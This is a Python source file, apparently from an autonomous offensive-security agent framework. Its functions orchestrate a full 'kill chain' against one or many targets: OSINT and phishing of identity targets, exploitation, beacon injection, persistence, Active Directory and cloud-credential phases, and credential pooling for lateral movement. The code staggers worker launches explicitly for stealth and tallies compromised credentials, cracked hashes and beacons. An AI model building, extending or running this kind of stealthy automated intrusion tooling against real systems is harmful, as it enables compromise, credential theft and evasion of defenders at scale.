        for ep in sorted(eps_list, key=lambda e: getattr(e, "ts", 0.0),
                         reverse=True):
            if getattr(ep, "ok", True) or not getattr(ep, "repair", ""):
                continue
            pattern = (f"'wall {ep.technique} -> {ep.cause} was unblocked "
                       f"by {ep.repair}'")
            break
    except Exception:
        pattern = ""
    where = ("global memory " + str(stats.get("path", ""))
             if stats.get("enabled") else "run-only memory (not on disk)")
    if not eps:
        return ("Learning receipt: 0 episodes this run — nothing to "
                f"remember yet ({where}).")
    parts = [f"Learning receipt: {eps} episode(s) recorded",
             f"{repairs} unblock(s) learned"]
    if pattern:
        parts.append(f"next run reorders around {pattern}")
    return " — ".join(parts) + f" ({where})."


def _learning_receipt(agent) -> Optional[str]:
    """The receipt line for the end-of-run notifier call, or None."""
    try:
        if agent.experience is None:
            return None
        return experience_receipt(agent.experience)
    except Exception:
        return None


def _run_target_with_workers(target: str, profile: str, aggressive: bool,
                             goal: str, on_event: Optional[Callable[[str, dict], None]],
                             max_iterations: int,
                             scope_list: Optional[List[str]],
                             toolchain, runner, cred_discoverer, sandbox,
                             share: Optional[ShareContext],
                             beacon_builder, social_engine,
                             state_path: Optional[str],
                             workers_per_target: int,
                             hunt_runner=None,
                             hunt_delay: Optional[float] = None,
                             paranoid: bool = False,
                             speed: bool = False,
                             threat_intel=None,
                             persist_learning: bool = False,
                             experience: bool = False,
                             evolution: bool = False,
                             llm: bool = False,
                             stop_event=None,
                             seed_findings=None,
                             reason_profile: str = "",
                             resilient_stager: bool = True,
                             identity_active: bool = False,
                             cell_loop: bool = False,
                             cell_stages: Optional[List[str]] = None,
                             evolution_mode: str = "code") -> tuple:
    """Same-target parallel workers sharing ONE WorldModel (stealth design).

    The lead runs the full kill chain as usual; extra workers deepen single
    phases without ever firing tools concurrently on the same host:

      workers_per_target >= 2  -> deepen worker   (goal "enrich", no gate:
                                  passive OSINT/breach/profile deepening +
                                  grabber polling while the LEAD waits for
                                  the human — the wait is never idle, and a
                                  newly discovered email/phone/handle can
                                  prove waiting was unnecessary)
      workers_per_target >= 2  -> exploit worker  (goal "exploit", gate:
                                  waits until `service` facts exist)
      workers_per_target >= 3  -> post worker     (goal "post_exploit", gate:
                                  waits until a `beacon` is registered)

    The gates are fact-based, not time-based: a worker stays silent until
    the shared world model contains the facts its phase needs, and every
    worker start is jittered (3-9s) so tool launches are staggered. The
    lead sees worker findings the next iteration (and vice versa).
    """
    import random as _r
    from phantom.automation.guidance.targets import classify_target
    wm = WorldModel(target=target, target_type=classify_target(target))

    def _build(worker: Optional[str] = None) -> "AutonomousAgent":
        if worker is not None:
            def ev(kind, data, _w=worker):
                if on_event:
                    on_event(kind, {**data, "target": target, "worker": _w})
        else:
            ev = on_event
        agent = AutonomousAgent(
            target=target, profile=profile, aggressive=aggressive,
            paranoid=paranoid, speed=speed,
            on_event=ev, scope_list=scope_list, toolchain=toolchain,
            cred_discoverer=cred_discoverer, sandbox=sandbox, share=share,
            beacon_builder=beacon_builder, social_engine=social_engine,
            shared_wm=wm, hunt_runner=hunt_runner, hunt_delay=hunt_delay,
            threat_intel=threat_intel, persist_learning=persist_learning,
            experience=experience, evolution=evolution, llm=llm,
            stop_event=stop_event, reason_profile=reason_profile,
            resilient_stager=resilient_stager,
            identity_active=identity_active,
            cell_loop=cell_loop, cell_stages=cell_stages,
            evolution_mode=evolution_mode)
        if runner is not None:
            from phantom.automation.runtime.stealth_runtime import TimingGovernor
            agent.runtime = StealthRuntime(
                agent.stealth_engine, runner=runner,
                cost_per_action=0.5,
                governor=TimingGovernor(base_delay=0.0, jitter=0.0))
        return agent

    worker_specs = []
    if workers_per_target >= 2:
        worker_specs.append(("deepen", "enrich", "", 1200.0))
    if workers_per_target >= 2:
        worker_specs.append(("exploit", "exploit", "service", 1200.0))
    if workers_per_target >= 3:
        worker_specs.append(("post", "post_exploit", "beacon", 1200.0))
    if workers_per_target >= 4:
        # a 4th worker owns the AD phase (dual-channel: beacon or direct)
        worker_specs.append(("ad", "ad", "ad_domain", 240.0))
    if workers_per_target >= 5:
        # a 5th worker owns the cloud/IAM phase (metadata + STS + cross-account)
        worker_specs.append(("cloud", "cloud_creds", "environment", 240.0))

    threads = []
    worker_results: Dict[str, Any] = {}
    for role, wgoal, gate, wtimeout in worker_specs:
        def _worker(role=role, wgoal=wgoal, gate=gate, wtimeout=wtimeout):
            time.sleep(_r.uniform(3.0, 9.0))  # staggered start (stealth)
            try:
                wagent = _build(worker=role)
                worker_results[role] = wagent.run(
                    goal=wgoal, max_iterations=max_iterations,
                    phase_wait=gate, phase_wait_timeout=wtimeout)
            except Exception as e:
                worker_results[role] = {"error": str(e)}
        th = threading.Thread(target=_worker, daemon=True)
        th.start()
        threads.append(th)

    lead = _build()
    _seed_agent(lead, seed_findings)
    result = lead.run(goal=goal, max_iterations=max_iterations,
                      checkpoint_path=state_path)
    for th in threads:
        th.join(timeout=300.0)
    if worker_results:
        result = {**result, "workers": worker_results}
    return result, lead


def run_autonomous(target: str, target_type: str = "auto",
                   profile: str = "enterprise", aggressive: bool = False,
                   stealth: bool = True,
                   paranoid: bool = False,
                   speed: bool = False,
                   goal: str = "complete_kill_chain",
                   on_event: Optional[Callable[[str, dict], None]] = None,
                   max_iterations: int = 20,
                   return_agent: bool = False,
                   scope_list: Optional[List[str]] = None,
                   toolchain: Optional[ToolRegistry] = None,
                   runner: Optional[Callable[[str, float], Any]] = None,
                   cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                   sandbox: Optional[SandboxEngine] = None,
                   share: Optional[ShareContext] = None,
                   beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                   social_engine: Optional[Any] = None,
                   trojan_assets: Optional[Dict[str, str]] = None,
                   state_path: Optional[str] = None,
                   command_seed: int = 0,
                   workers_per_target: int = 1,
                   hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                   hunt_delay: Optional[float] = None,
                   threat_intel=None,
                   persist_learning: bool = False,
                   experience: bool = False,
                   evolution: bool = False,
                   llm: bool = False,
                   seed_findings: Optional[List[Dict[str, Any]]] = None,
                   stop_event=None,
                   reason_profile: str = "",
                   resilient_stager: bool = True,
                   identity_active: bool = False,
                   cell_loop: bool = True,
                   cell_stages: Optional[List[str]] = None,
                   evolution_mode: str = "code"):
    """Full autonomous kill-chain run against a target.

    target_type defaults to "auto": the target is classified at runtime as
    ip/domain/url/email/username/phone and the kill chain is adapted to
    the type (identity targets run OSINT -> phish -> victim_ip first, then
    the network chain converges on beacon injection + persistence).

    With state_path set, the run resumes from the checkpoint file when it
    exists (world model + dead capabilities restored) and writes a
    checkpoint after every wave so an interrupted run continues from the
    last persisted facts.

    workers_per_target > 1 fans the same target out to phase workers
    sharing one WorldModel (exploit / post workers, fact-gated + jittered
    starts) — see _run_target_with_workers for the stealth contract.

    Returns the result dict; with return_agent=True returns (result, agent).
    """
    if state_path and os.path.exists(state_path):
        agent = AutonomousAgent.from_state(
            state_path, on_event=on_event, scope_list=scope_list,
            toolchain=toolchain, runner=runner,
            cred_discoverer=cred_discoverer, sandbox=sandbox,
            share=share, beacon_builder=beacon_builder,
            social_engine=social_engine, trojan_assets=trojan_assets,
            command_seed=command_seed, hunt_runner=hunt_runner,
            hunt_delay=hunt_delay, resilient_stager=resilient_stager)
        agent.enterprise = EnterpriseBrain(agent.profile,
                                           threat_intel=threat_intel)
        agent.persist_learning = persist_learning
        # the checkpoint restore path must honour the same experience and
        # evolution policy as a fresh run, or resuming would silently change it
        agent.evolution = evolution
        agent.experience = _make_experience(experience)
        agent.planner.experience = agent.experience
        if llm and getattr(agent, "llm_advisor", None) is not None:
            try:
                agent.experience.set_classifier(
                    agent.llm_advisor.classify_failure)
            except Exception:
                pass
        if llm:
            from phantom.automation.llm_advisor import LLMAdvisor
            agent.llm_advisor = LLMAdvisor(enabled=True,
                                           paranoid=agent.paranoid)
        agent._stop_event = stop_event
        _seed_agent(agent, seed_findings)
        result = agent.run(goal=goal, max_iterations=max_iterations,
                           checkpoint_path=state_path)
        if return_agent:
            return result, agent
        return result
    if workers_per_target > 1:
        result, agent = _run_target_with_workers(
            target=target, profile=profile, aggressive=aggressive,
            paranoid=paranoid, speed=speed,
            goal=goal, on_event=on_event, max_iterations=max_iterations,
            scope_list=scope_list, toolchain=toolchain, runner=runner,
            cred_discoverer=cred_discoverer, sandbox=sandbox,
            share=share, beacon_builder=beacon_builder,
            social_engine=social_engine, state_path=state_path,
            workers_per_target=workers_per_target, hunt_runner=hunt_runner,
            hunt_delay=hunt_delay, threat_intel=threat_intel,
            persist_learning=persist_learning, experience=experience,
            llm=llm, identity_active=identity_active,
            stop_event=stop_event, seed_findings=seed_findings,
            reason_profile=reason_profile,
            resilient_stager=resilient_stager,
            cell_loop=cell_loop, cell_stages=cell_stages,
            evolution_mode=evolution_mode)
        if return_agent:
            return result, agent
        return result
    agent = AutonomousAgent(target, target_type, profile, aggressive,
                            stealth, paranoid, speed, on_event,
                            scope_list=scope_list,
                            toolchain=toolchain,
                            cred_discoverer=cred_discoverer,
                            sandbox=sandbox, share=share,
                            beacon_builder=beacon_builder,
                            social_engine=social_engine,
                            trojan_assets=trojan_assets,
                            command_seed=command_seed,
                            hunt_runner=hunt_runner,
                            hunt_delay=hunt_delay,
                            threat_intel=threat_intel,
                            persist_learning=persist_learning,
                            experience=experience,
                            evolution=evolution,
                            llm=llm,
                            stop_event=stop_event,
                            reason_profile=reason_profile,
                            resilient_stager=resilient_stager,
                            identity_active=identity_active,
                            cell_loop=cell_loop,
                            cell_stages=cell_stages,
                            evolution_mode=evolution_mode)
    if runner is not None:
        from phantom.automation.runtime.stealth_runtime import TimingGovernor
        agent.runtime = StealthRuntime(
            agent.stealth_engine, runner=runner,
            cost_per_action=0.5,
            governor=TimingGovernor(base_delay=0.0, jitter=0.0))
    _seed_agent(agent, seed_findings)
    result = agent.run(goal=goal, max_iterations=max_iterations,
                       checkpoint_path=state_path)
    if return_agent:
        return result, agent
    return result


def _seed_agent(agent, seed_findings: Optional[List[Dict[str, Any]]]) -> int:
    """Inject pre-existing facts (from the manual core) into an agent's
    WorldModel. Never overwrites a stronger fact the agent already owns, so
    re-seeding is always safe."""
    if not seed_findings:
        return 0
    wm = getattr(agent, "wm", None)
    if wm is None:
        return 0
    applied = 0
    for s in seed_findings:
        kind = s.get("kind")
        key = s.get("key")
        if not kind or key is None:
            continue
        if wm.get(kind, key) is not None:
            continue
        try:
            wm.add_finding(kind, key, s.get("value"),
                           confidence=float(s.get("confidence", 0.6)),
                           source=s.get("source", "seed"),
                           target=getattr(agent, "target", ""))
            applied += 1
        except Exception:
            continue
    return applied


def run_campaign(targets: List[str], profile: str = "enterprise",
                 aggressive: bool = False,
                 paranoid: bool = False,
                 speed: bool = False,
                 goal: str = "complete_kill_chain",
                 scope_list: Optional[List[str]] = None,
                 max_agents: int = 3, on_event: Optional[Callable[[str, dict], None]] = None,
                 max_iterations: int = 20,
                 toolchain: Optional[ToolRegistry] = None,
                 runner: Optional[Callable[[str, float], Any]] = None,
                 cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                 sandbox: Optional[SandboxEngine] = None,
                 share: Optional[ShareContext] = None,
                 beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                 social_engine: Optional[Any] = None,
                 state_dir: Optional[str] = None,
                 workers_per_target: int = 1,
                 hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                 hunt_delay: Optional[float] = None,
                 threat_intel=None,
                 persist_learning: bool = False,
                 experience: bool = False,
                 evolution: bool = False,
                 llm: bool = False,
                 identity_active: bool = False,
                 stop_event=None) -> Dict[str, Any]:
    """Multi-target campaign: one sub-agent per target, fanned out through a
    bounded pool (`max_agents` concurrent sub-agents).

    Every sub-agent is fully autonomous (own WorldModel, own beacon
    session, own retry discipline). A shared ShareContext pools credentials
    across sub-agents (reuse / lateral movement) and lists the peer targets.
    Events are streamed with the target attached so the console can tell
    the sub-agents apart. Returns {target: result} plus campaign-level
    aggregates.

    workers_per_target > 1 additionally spawns same-target phase workers
    (exploit at >=2, post at >=3) sharing one WorldModel per target:
    fact-gated and jittered, so tools never fire concurrently on one host.
    """
    import threading

    if not targets:
        return {"targets": [], "results": {}}
    scope_list = scope_list or []
    share = share if share is not None else ShareContext(peers=list(targets))

    results: Dict[str, Dict[str, Any]] = {}
    agents: Dict[str, Any] = {}
    lock = threading.Lock()
    sem = threading.BoundedSemaphore(max(1, max_agents))

    def _fan_out(target: str) -> None:
        def _stream(kind: str, data: dict) -> None:
            if on_event:
                on_event(kind, {**data, "target": target})

        state_path = None
        if state_dir:
            import re
            safe = re.sub(r"[^A-Za-z0-9._\-]", "_", target)
            state_path = os.path.join(state_dir, f"{safe}.json")
        # sub-agent lifecycle is observable: without these the console showed
        # a target's stream start mid-sentence, with no way to tell a queued
        # sub-agent from a running one or to see how each one ended.
        _stream("worker", {"worker": target, "phase": "queued",
                           "pool": max(1, max_agents)})
        with sem:
            started = time.time()
            _stream("worker", {"worker": target, "phase": "start",
                               "role": ("phase-workers"
                                        if workers_per_target > 1 else "lead"),
                               "workers": workers_per_target})
            if workers_per_target > 1:
                result, agent = _run_target_with_workers(
                    target=target, profile=profile, aggressive=aggressive,
                    paranoid=paranoid, speed=speed,
                    goal=goal, on_event=_stream,
                    max_iterations=max_iterations,
                    scope_list=scope_list, toolchain=toolchain, runner=runner,
                    cred_discoverer=cred_discoverer, sandbox=sandbox,
                    share=share, beacon_builder=beacon_builder,
                    social_engine=social_engine, state_path=state_path,
                    workers_per_target=workers_per_target,
                    hunt_runner=hunt_runner, hunt_delay=hunt_delay,
                    threat_intel=threat_intel,
                    persist_learning=persist_learning, experience=experience,
                    evolution=evolution, llm=llm,
                    identity_active=identity_active, stop_event=stop_event)

            else:
                result, agent = run_autonomous(
                    target=target, profile=profile, aggressive=aggressive,
                    paranoid=paranoid, speed=speed,
                    goal=goal, on_event=_stream, max_iterations=max_iterations,
                    return_agent=True, scope_list=scope_list,
                    toolchain=toolchain, runner=runner,
                    cred_discoverer=cred_discoverer, sandbox=sandbox,
                    share=share, beacon_builder=beacon_builder,
                    social_engine=social_engine,
                    state_path=state_path, hunt_runner=hunt_runner,
                    hunt_delay=hunt_delay, threat_intel=threat_intel,
                    persist_learning=persist_learning, experience=experience,
                    evolution=evolution, llm=llm, stop_event=stop_event,
                    identity_active=identity_active)
        _stream("worker", {
            "worker": target, "phase": "done",
            "seconds": round(time.time() - started, 1),
            "actions": int((result or {}).get("actions_taken", 0) or 0),
            "goal_met": bool((result or {}).get("beacon_established")
                             or (result or {}).get("cleanup_done")),
            "failures": int((result or {}).get("failures", 0) or 0),
        })
        with lock:
            results[target] = result
            agents[target] = agent

    threads = [threading.Thread(target=_fan_out, args=(t,), daemon=True)
               for t in targets]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    return {
        "targets": targets,
        "goal": goal,
        "results": results,
        "beacons": sum(1 for r in results.values() if r.get("beacon_established")),
        "persistent": sum(1 for r in results.values() if r.get("persistence_installed")),
        "compromised_creds": sum(r.get("creds_found", 0) for r in results.values()),
        "services": sum(r.get("services_enumerated", 0) for r in results.values()),
        "pivots": sum(r.get("lateral_movements", 0) for r in results.values()),
        "ad_domains": sum(r.get("ad_domains", 0) for r in results.values()),
        "cracked_hashes": sum(r.get("cracked_hashes", 0) for r in results.values()),
        "cleanup_done": sum(1 for r in results.values() if r.get("cleanup_done")),
        "failures": sum(r.get("failures", 0) for r in results.values()),
        "_agents": agents,
    }
